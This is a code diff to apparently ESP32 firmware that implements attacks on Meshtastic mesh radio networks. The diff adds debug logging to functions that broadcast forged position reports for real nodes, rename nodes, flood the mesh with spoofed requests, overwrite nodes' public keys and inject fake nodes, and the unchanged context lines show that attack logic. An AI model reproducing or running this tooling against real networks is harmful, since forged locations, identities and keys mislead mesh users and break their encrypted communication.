@@ -2,6 +2,8 @@
 #include "esp_log.h"
 #include <iterator>
 
+extern void sendDebugMessage(const std::string& message);
+
 uint32_t TMAttack::getRandomTarget() {
     auto ret = meshtasticCompact->nodeinfo_db.getRandomNode();
     if (ret) {
@@ -31,9 +33,12 @@ void TMAttack::atkRndPos() {
     if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
         srcnode = getRandomTarget();
         if (srcnode == 0) {
+            sendDebugMessage("No valid target found for position poison attack.");
             return;  // no valid target found
         }
     }
+    sendDebugMessage("Sending fake position for node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
+    meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
     meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
 }
 
@@ -42,11 +47,13 @@ void TMAttack::atkNameChange() {
     if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
         srcnode = getRandomTarget();
         if (srcnode == 0) {
+            sendDebugMessage("No valid target found for name change attack.");
             return;  // no valid target found
         }
     }
     auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
     if (!node) {
+        sendDebugMessage("No valid target found for name change attack.");
         return;  // no valid target found
     }
 
@@ -69,20 +76,25 @@ void TMAttack::atkNameChange() {
     node->long_name[39] = '\0';
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
+    sendDebugMessage("Changed longname of node 0x" + std::to_string(srcnode) + " to \"" + node->long_name + "\"");
 }
 
 void TMAttack::atkDdos() {
     uint32_t srcnode = esp_random();
     meshtasticCompact->SendRequestPositionInfo(0xffffffff, 8, srcnode);
+    sendDebugMessage("Sent DDOS msg 1 request from 0x" + std::to_string(srcnode));
     srcnode = getRandomTarget();
     if (srcnode == 0) {
+        sendDebugMessage("No valid target found for DDOS 2 attack.");
         return;  // no valid target found
     }
     MC_NodeInfo* node = meshtasticCompact->nodeinfo_db.get(srcnode);
     if (!node) {
+        sendDebugMessage("No valid target found for DDOS 2 attack.");
         return;  // no valid target found
     }
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, true);
+    sendDebugMessage("Sent DDOS msg 2 from 0x" + std::to_string(srcnode));
 }
 
 void TMAttack::atkPkiPoison() {
@@ -90,11 +102,13 @@ void TMAttack::atkPkiPoison() {
     if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
         srcnode = getRandomTarget();
         if (srcnode == 0) {
+            sendDebugMessage("No valid target found for PKI poison attack.");
             return;  // no valid target found
         }
     }
     auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
     if (!node) {
+        sendDebugMessage("No valid target found for PKI poison attack.");
         return;  // no valid target found
     }
     for (int i = 0; i < 32; i++) {
@@ -102,6 +116,7 @@ void TMAttack::atkPkiPoison() {
     }
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
+    sendDebugMessage("Sent PKI poison for node 0x" + std::to_string(srcnode));
 }
 
 void TMAttack::atkRndNode() {
@@ -133,6 +148,7 @@ void TMAttack::atkRndNode() {
     meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
     meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
     meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+    sendDebugMessage("Sent fake node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
 void TMAttack::loop() {
